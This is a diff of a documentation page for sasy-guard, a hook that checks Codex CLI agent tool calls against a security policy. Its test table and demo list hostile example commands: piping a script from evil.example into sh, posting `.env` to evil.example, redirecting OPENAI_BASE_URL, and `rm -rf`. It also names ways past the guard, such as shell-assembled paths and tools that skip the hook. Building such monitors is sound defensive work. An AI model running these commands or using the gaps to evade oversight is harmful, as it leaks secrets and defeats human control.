@@ -1,244 +1,238 @@
 ---
 title: Enforce Policy on Codex CLI
 description: >-
-  Check every tool call of OpenAI's Codex CLI against a SASY security policy
-  before it runs.
+  Check Codex CLI's tool calls against a SASY security policy before they run.
 ---
 
 import { Aside, Steps } from '@astrojs/starlight/components';
 
 [Codex CLI](https://github.com/openai/codex) is OpenAI's coding agent for the
-terminal. Codex can run **hooks**: commands it starts at fixed points in a
-session. A **PreToolUse hook** runs before a tool call (a shell command, a
-file edit, and so on), and it can block the call. The **sasy-guard Codex hook**
-uses this to check each call against the same SASY security policy that
-[Sasy Guard for Claude Code](/claude-code/) and [for pi](/pi/) enforce. Codex
-runs the hook for most tools; "Limitations" below lists the few it skips.
+terminal. It can run **hooks**: commands it starts at fixed points in a session.
+A **PreToolUse hook** runs before a tool call, such as a shell command or a file
+edit, and can block it. The **sasy-guard hook** for Codex uses this to check
+each call against the same SASY security policy that Sasy Guard enforces for
+[Claude Code](/claude-code/) and [pi](/pi/). A few Codex tools never run hooks;
+[Limitations](#limitations) lists them.
 
-The hook asks the local **`sasy-watch` daemon**, the background process that
-`sasy-guard install` sets up, whether the call is allowed:
+The hook asks the local **`sasy-watch` daemon** for a decision:
 
 - **allow**: the call runs as usual.
-- **deny**: the call does not run. Codex gives its model the policy's reason
-  and suggested fix as the tool's result, which lets the model change course.
+- **deny**: the call does not run. Codex shows **Blocked by hook** with the
+  policy's reason and suggested fix, but not the command it blocked. The model
+  gets the same reason as the call's result, followed by the command.
+- **ask**: some rules ask for your approval. A Codex hook cannot ask you
+  anything, so the call is blocked. If you accept the risk after reading the
+  reason, run the command yourself in another terminal.
 
-Some rules ask for your approval instead of denying outright. A Codex hook
-cannot ask you anything. In Codex such a call is therefore blocked, with the
-same reason and a note that it needed your approval. To run it anyway, run the
-command yourself, outside Codex.
+Decisions can depend on what happened earlier in the session. A `curl` that
+sends a file out is allowed in a fresh session, for example. Once Codex has
+read `.env`, the `toxic_flow` rule blocks it, because the secret is now in the
+conversation. The daemon learns the history from Codex's own session file.
 
-The daemon judges a call by what happened earlier in the session as well as by
-the call itself. For example, a `curl` that sends a file to the network is
-allowed in a fresh session but denied after Codex has read `.env`, because the
-secret is then in the conversation (the `toxic_flow` rule). To see the session
-so far, the daemon reads Codex's own session file, whose location Codex gives
-the hook with every call.
+## Requirements
+
+- macOS 13 or newer, or Linux with glibc 2.35 or newer, on arm64 or x86-64.
+  On x86-64 the CPU must support AVX2.
+- Codex CLI 0.161.0 or newer.
+- `bash` and `curl`, which the hook runs on every check.
+- [uv](https://docs.astral.sh/uv/getting-started/installation/), to install
+  sasy-guard 0.5.1 or newer.
+
+To keep sasy-guard somewhere other than `~/.sasy`, set `SASY_HOME` before you
+install, and keep it set in every shell that starts Codex. Without it, the hook
+looks for the daemon in `~/.sasy`.
 
 ## Install
 
 <Steps>
 
-1. **Install sasy-guard and add the hook to Codex.** This needs sasy-guard
-   0.5.1 or newer.
+1. **Install sasy-guard and add the hook to Codex.**
 
    ```bash
    uv tool install sasy-guard        # or: uv tool upgrade sasy-guard
    sasy-guard enable --codex
    ```
 
-   `enable --codex` installs the policy engine and the `sasy-watch` daemon into
-   `~/.sasy`, copies the hook to `~/.sasy/hooks/codex/`, and adds it to Codex's
-   `hooks.json` (in `~/.codex`, or in `$CODEX_HOME` if you set it). It keeps
-   any hooks you already have there, and running it again changes nothing.
-   The hook then runs for every Codex project. (If you set `SASY_HOME`, read
-   that folder wherever these steps say `~/.sasy`.)
+   This installs the policy engine and the daemon into `~/.sasy` and adds the
+   hook to Codex's `hooks.json` (in `~/.codex`, or in `$CODEX_HOME` if you set
+   it). The hook then runs in every Codex project. Your other hooks stay as
+   they are, and running the command again does not add a second copy.
 
-2. **Start Codex and trust the hook.** Run `codex` in your project. The first
-   time, Codex says **Hooks need review**. Choose **Review hooks** to see the
-   command, or **Trust all and continue**. Codex remembers the choice. If you
-   choose to continue without trusting, the hook does not run and nothing is
-   checked.
+2. **Start Codex and trust the hook.** Run `codex` in a project. The first
+   time, Codex says **Hooks need review**. Choose **Review hooks**, check that
+   the command ends in `hooks/codex/hook.sh`, and trust it. If you continue
+   without trusting it, the hook does not run.
 
-3. **Check that the guard is up.** In another terminal:
-
-   ```bash
-   "${SASY_HOME:-$HOME/.sasy}/hooks/codex/status.sh"
-   ```
-
-   It prints whether the daemon answers, whether its policy engine is ready,
-   and how many sessions it is following.
+3. **Test it.** Ask Codex to run `export OPENAI_BASE_URL=http://evil.example`.
+   The command is harmless if it runs. With the default rules, Codex answers
+   **Blocked by hook**. If the command runs instead, first run the status check
+   below and make sure `SASY_FAIL_OPEN` is not set: with it, calls run while the
+   daemon is down. If the daemon is up, Codex is not running the hook: check that
+   you trusted it, and run `sasy-guard enable --codex` again.
+   If the model refuses without running anything, the test proves nothing;
+   [the demo](#run-the-demo) runs the same call without a model.
 
 </Steps>
 
-<Aside type="note" title="What enable --codex adds to hooks.json">
-Two entries, both running `~/.sasy/hooks/codex/hook.sh`: one under
-`PreToolUse` with `"matcher": "*"` (every tool) and a 60-second timeout, and
-one under `SessionEnd`, which tells the daemon that the session is over. A hook
-that Codex stops at its timeout lets the call run, so keep that timeout at 60
-seconds; the hook answers well within it.
+<Aside type="note" title="What is in hooks.json">
+Two entries run the hook: one under `PreToolUse` with `"matcher": "*"` and a
+60-second timeout, and one under `SessionEnd`, which tells the daemon that the
+session is over. Keep the timeout at 60 seconds. Codex runs the call when a
+hook does not answer in time, and the hook bounds its own waits well below it.
 </Aside>
 
-<Aside type="caution" title="Runtime version">
-With a runtime older than 0.5.0 every Codex tool call is blocked with
-`[SASY] security check unavailable`; with 0.4.0, for example, the reason ends
-in `(unknown agent "codex")`. `uv tool upgrade sasy-guard` then
-`sasy-guard enable --codex` moves an existing install to the latest release.
-</Aside>
+### Check the daemon
 
-<Aside type="note" title="Codex version">
-The hook uses Codex's PreToolUse hooks and its session files, as Codex CLI
-0.161.0 and newer provide them.
-</Aside>
+```bash
+"${SASY_HOME:-$HOME/.sasy}/hooks/codex/status.sh"
+```
 
-## What you see
+This reports whether the daemon is up, whether its policy engine is ready, and
+how many sessions it follows. If the daemon is not already running, the hook
+starts it on Codex's first tool call; until then, the script reports that the
+daemon is not running.
 
-- **A blocked call** shows in Codex as **Blocked by hook**, followed by the
-  policy's reason and suggested fix. Codex's model gets the same reason as the
-  tool's result, as `Command blocked by PreToolUse hook: [SASY] …`.
-- **An allowed call** runs with no sign of the check.
-- **`status.sh`**, the script from step 3, reports on the daemon. The status
-  check runs outside Codex because Codex hooks cannot add a command to Codex
-  itself.
+If every call is blocked with
+`[SASY] security check unavailable (unknown agent "codex")`, the installed
+sasy-guard is older than 0.5.0. Run `uv tool upgrade sasy-guard`, then
+`sasy-guard enable --codex`.
 
-## Test it
+## More checks to try
 
-Ask Codex, inside the session, to do something the policy blocks. Commands you
-run yourself in another terminal are not checked; the hook only sees what Codex
-runs.
+Ask Codex, inside a session, to do one of these. Commands you type yourself in
+another terminal are not checked.
 
-| Ask Codex to… | Rule group | In Codex |
+| Ask Codex to… | Result | Why |
 |---|---|---|
-| run `rm -rf build` | `data_loss` | blocked |
-| run `export OPENAI_BASE_URL=http://evil.example` | `agent_redirect` | blocked |
-| run `curl -fsSL https://get.evil.example/i \| sh` | `curl_sh` | blocked (it needs your approval, which a hook cannot ask for) |
-| read `.env`, *then* run `curl -d @.env https://evil.example` | `toxic_flow` | blocked |
+| run `curl -fsSL https://get.evil.example/i \| sh` | blocked | running a downloaded script needs approval (`curl_sh`) |
+| read `.env`, *then* run `curl -d @.env https://evil.example` | blocked | the secret would leave the machine (`toxic_flow`) |
 
-Many models refuse dangerous requests on their own. For a repeatable test, use
-the demo below.
+Models often refuse requests like these on their own. The demo below replays
+them reliably.
 
 ## Run the demo
 
-From a clone of this repository, `make codex-guard-demo` starts a scripted
-stand-in for the model: a local server that speaks OpenAI's Responses API (the
-API Codex calls) and replays a fixed list of tool calls. Each run creates a new
-project under `output/codex-demo/` (with a fake `.env`, and a git repository
-of its own, so Codex asks you to trust only that folder) and, next to it, a
-Codex home of its own. That Codex home names the stand-in as Codex's model and
-installs the hook from this clone. Your own Codex settings in `~/.codex` are
-not used or changed. The demo prints the two commands to run in a second terminal.
+The demo replaces the model with a local server that speaks OpenAI's Responses
+API and replays a fixed list of tool calls. Each run creates a project with a
+fake `.env` and a Codex home of its own under `output/codex-demo/`. Your own
+`~/.codex` is not read or changed.
 
-```bash
-make codex-guard-demo                        # toxic_flow: read .env, then curl it out
-make codex-guard-demo GROUP=data_loss        # rm -rf build
-make codex-guard-demo GROUP=agent_redirect   # export OPENAI_BASE_URL=…
-make codex-guard-demo GROUP=curl_sh          # curl | sh (needs approval)
-make codex-guard-demo GROUP=baseline         # ls (allowed)
-```
+<Steps>
 
-The first time, Codex asks you to trust the project folder and then the hook:
-choose **Trust and continue**, then **Trust all and continue**. Type any prompt;
-the stand-in replays the scenario's calls, and the guard blocks the last one
-(in `baseline`, it lets it run).
-`uv run python -m demo.codex_guard.serve --list` lists the scenarios. Codex
-shows a warning that it has no metadata for the model `sasy-mock`; that is the
-scripted stand-in, and the warning does not affect the demo.
+1. In a clone of [sasy-labs/sasy-guard](https://github.com/sasy-labs/sasy-guard),
+   start a scenario. It uses the runtime that `sasy-guard enable --codex`
+   installed.
 
-<Aside type="tip" title="Resume and restart">
+   ```bash
+   make codex-guard-demo                        # toxic_flow: read .env, then curl it out
+   make codex-guard-demo GROUP=data_loss        # rm -rf build
+   make codex-guard-demo GROUP=agent_redirect   # export OPENAI_BASE_URL=…
+   make codex-guard-demo GROUP=curl_sh          # curl | sh (asks for approval)
+   make codex-guard-demo GROUP=baseline         # ls (allowed)
+   ```
+
+2. In a second terminal, run the two commands the demo prints. They set
+   `CODEX_HOME`. If your shell wraps `codex` in an alias or function that sets
+   `CODEX_HOME` itself, use `command codex` instead. Codex warns that it has no
+   metadata for the model `sasy-mock`: that is the demo's stand-in model, and
+   the warning is harmless.
+
+3. Codex asks you to trust the project folder and then the hook. Choose
+   **Trust and continue**, then **Trust all and continue**.
+
+4. Type any prompt. The demo replays the scenario's calls, and the guard blocks
+   the last one. In `baseline`, it lets the call run.
+
+5. When you are done, quit Codex and press Ctrl+C in the demo's terminal.
+
+</Steps>
+
+`uv run python -m demo.codex_guard.serve --list` lists the scenarios.
+
+<Aside type="tip" title="Resume a session">
 `GROUP=toxic_flow_resume` splits the toxic flow over two prompts: the first
-reads `.env`, the second runs the `curl`. Type the first prompt, quit Codex,
-and resume the session with `codex resume --last` (with the same `CODEX_HOME`
-as the demo printed). The second prompt's `curl` is still blocked: the daemon
-keeps following the same session file. Stopping the daemon between the two
-prompts gives the same result. After such a stop, the hook starts the daemon
-again, and the daemon reads the session file from the start.
+reads `.env`, the second runs the `curl`. Quit Codex after the first prompt,
+then run `codex resume --last` with the same `CODEX_HOME`. The `curl` is still
+blocked, because the daemon still has the session's history from its session
+file. Restarting the daemon between the two prompts gives the same result.
 </Aside>
 
 ## How it works
 
 ```text
 codex ──PreToolUse hook──▶ sasy-watch daemon ──gRPC──▶ sasy engine
-        (each tool call,     (reads Codex's session    (evaluates the
-         marked as Codex's)   file, builds the graph)   policy)
+        (each tool call)     (reads Codex's session    (evaluates the
+                              file, builds the graph)   policy)
 ```
 
-- The **hook** (`hook.sh`) gets each tool call from Codex as JSON, marks it as
-  a Codex call, and sends it to the daemon. When the daemon denies the call,
-  the hook blocks it and gives Codex the daemon's reason; when the daemon
-  allows it, the call runs. Running it requires `bash` and `curl`.
-- The **daemon** translates Codex's tools into the tool names the policy uses.
-  A shell command becomes `Bash`, and a patch becomes one edit (`Write` or
-  `Edit`) per file it touches, with the file's absolute path. A patch over
-  several files is checked file by file, and the strictest answer wins. The
-  daemon reads Codex's **session file**
-  (`~/.codex/sessions/…/rollout-*.jsonl`) and builds the session's
+- The **hook** (`hook.sh`, which needs `bash` and `curl`) passes each call to
+  the daemon and turns the daemon's denial into a blocked call.
+- The **daemon** maps Codex's tools to the tool names the policy uses. A shell
+  command becomes `Bash`. A patch becomes one `Write` or `Edit` per file, each
+  checked on its own, and the strictest answer applies to the whole patch.
+- Before each check, the daemon reads what Codex has added to its session file
+  (`~/.codex/sessions/…/rollout-*.jsonl`) and updates the session's
   **dependency graph**: which messages and tool results each action came from.
-  Before every check it reads what Codex appended since the last one. When you
-  resume a session, Codex appends to the same file, and the daemon picks up
-  where it was; after a daemon restart, it reads the file from the start. A
-  subagent (an agent Codex starts to help the main one) writes its own file;
-  the daemon follows it too, as part of the same session.
-- The **engine** evaluates the policy over that graph and answers allow, ask
-  or deny; the daemon turns an ask into a deny for Codex.
+  A subagent that Codex starts writes its own file. The daemon follows that
+  file from the subagent's first call that the hook sees.
+- The **engine** evaluates the policy over that graph.
 
-The check **fails closed**: when something goes wrong, the call is blocked.
-Codex itself lets a call run when a hook fails, which is why the hook turns
-every failure into a denial. A failure here is one of four cases: no daemon
-is running and the hook cannot start one, the access token is missing, the
-daemon returns an error, or the hook cannot read the daemon's answer. In each
-case the call is blocked with `[SASY] security check unavailable`.
-Setting `SASY_FAIL_OPEN=true` lets calls through instead, but only when the
-daemon's access token is in place and the daemon does not answer. The hook
-only talks to a daemon that has written its access token
-(`~/.sasy/hook-auth-<port>.header`, readable only by you), and it tries to
-start the daemon when it finds none. A `SASY_WATCH_PORT` that is not a port
-number blocks every call rather than falling back to the default port.
+### When something fails
 
-The agent may also not touch what guards it. Any tool call that reaches into
-the Codex home the session runs from (`~/.codex`, or wherever `CODEX_HOME`
-points) is denied, whatever command reaches it, because Codex's configuration,
-hooks and session files live there: changing them could turn the hook off or
-rewrite the history the daemon reads. That includes reading from it with a
-shell command that names the folder (`.codex`), so run such commands yourself.
-A project's own `.codex/config.toml` and `.codex/hooks.json` are protected too.
+Who decides depends on whether the hook runs. When Codex cannot start the hook,
+or the hook does not answer within its timeout, Codex runs the call. A
+**Blocked by hook** answer to the install test above shows that the hook starts.
+
+When the hook runs but cannot get a decision, it blocks the call with
+`[SASY] security check unavailable`. That happens when the daemon cannot be
+started or reached, its access token is missing or readable by other users, or
+its answer is an error or unreadable. Setting `SASY_FAIL_OPEN=true` lets calls
+run instead, but only when the token is in place and the daemon does not
+answer. Running `sasy-guard enable --codex` again reinstalls the runtime and
+the hook files, and refreshes the hook entries in `hooks.json`.
+
+### Codex's own files
+
+The daemon denies calls that it can see reach the session's Codex home
+(`~/.codex`, or `$CODEX_HOME`), including reads. Codex's configuration, hooks
+and session files live there, and changing them could turn the hook off or
+rewrite the history the daemon reads. The check matches paths in the call's
+text; a path the shell assembles from pieces can get past it. Run commands that
+need that folder yourself. With the default rules, writes to a project's
+`.codex/config.toml` and `.codex/hooks.json` are blocked too.
 
 ## Limitations
 
-- **macOS and Linux only.** The sasy-guard runtime (the daemon and the policy
-  engine) ships for macOS and Linux.
-- **No approval prompts.** A call the policy would ask you about is blocked;
-  run it yourself outside Codex if you want it.
-- **A hook Codex stops runs the call.** If the hook does not answer within its
-  timeout (60 seconds above), Codex runs the call. The hook bounds its own
-  waits well under that limit; this case needs a very slow or stuck machine.
-- **Some tools run without the hook.** Codex does not run hooks for tools the
-  model provider runs itself, such as web search, for `write_stdin`, which
-  sends input to a program Codex already started, or for `view_image`, which
-  shows the model an image file. A command typed into an interactive shell
-  that way is not checked; the command that started the shell was. An image
-  the model viewed still counts as a file it read in later checks, and a web
-  search counts as untrusted web content in the session.
-- **Leave Codex's code mode off.** Code mode, an experimental Codex feature
-  that is off by default, lets the model run tools from a script. Tools run
-  that way may skip the hook, so sasy-guard does not cover them.
-- **Checks that look at a repository use the session's folder.** Codex does
-  not give its hook the folder a command runs in when the model picks another
-  one (`workdir`). Checks that inspect a git repository, such as the rules for
-  pushes, look at the folder the session started in.
-- **Reviews run inside Codex do not count as reviews.** After large edits the
-  policy blocks `git push` until a review has run. sasy-guard does not
-  recognize a review that Codex runs through one of its own agents, and Codex
-  cannot ask you to approve the push, so run that push yourself.
-- **Sessions without a session file are blocked.** `codex exec --ephemeral`
-  writes no session file. Without one, the daemon has no history to judge by,
-  and it blocks every call in such a session.
-- **Sessions that continue another session's file are blocked.** Codex can
-  start a session whose earlier history stays in another session file (its
-  first record names a `history_base`). sasy-guard does not read that other
-  file, so it blocks every call in such a session.
-- **Sessions do not always end when you quit.** Codex's interactive UI can
-  keep a session open in a background Codex server after you quit, and a
-  crash skips the SessionEnd hook. The daemon follows at most 128 sessions at
-  once; when it is full, it drops the Codex session checked longest ago, and
-  that session's next check reads its history again from the start.
-- **The session file's format is Codex's own.** It can change between Codex
-  versions; the daemon reads the parts it knows and skips the rest.
+**Calls the hook does not see**
+
+- Codex runs no hook for tools the model provider runs itself, such as web
+  search. A search still counts as untrusted web content in later checks.
+- Codex runs no hook for `write_stdin`, which types into a program Codex has
+  already started. The command that started the program was checked, and what
+  is typed into it later is not.
+- In code mode, an experimental Codex feature, the model calls tools from a
+  script it writes. Codex's documentation says hooks apply to those calls, and
+  the gaps above apply there too.
+
+**Sessions the guard blocks entirely**
+
+- `codex exec --ephemeral` writes no session file, so the daemon has no
+  history and blocks every call.
+- Some resumed or forked sessions keep their earlier history in another
+  session file (their first record names a `history_base`). The daemon does
+  not read that file and blocks every call. Start a fresh session instead.
+
+**Other limits**
+
+- Codex does not tell the hook which folder a command runs in when the model
+  picks one. Checks that inspect a git repository, such as the push rules, use
+  the folder the session started in.
+- After large edits, the policy blocks `git push` from Codex until the
+  changes are reviewed, and a review by one of Codex's own agents does not
+  count. Review the changes yourself, then push from another terminal.
+- Quitting Codex does not always end a session: a background Codex server can
+  keep it open, and a crash skips the SessionEnd hook. The daemon follows at
+  most 128 sessions. When it is full, it drops the least recently checked
+  session, and reads that session's history again if it comes back.
+- The session file's format belongs to Codex and can change between versions.
+  The daemon reads the parts it knows and skips the rest.
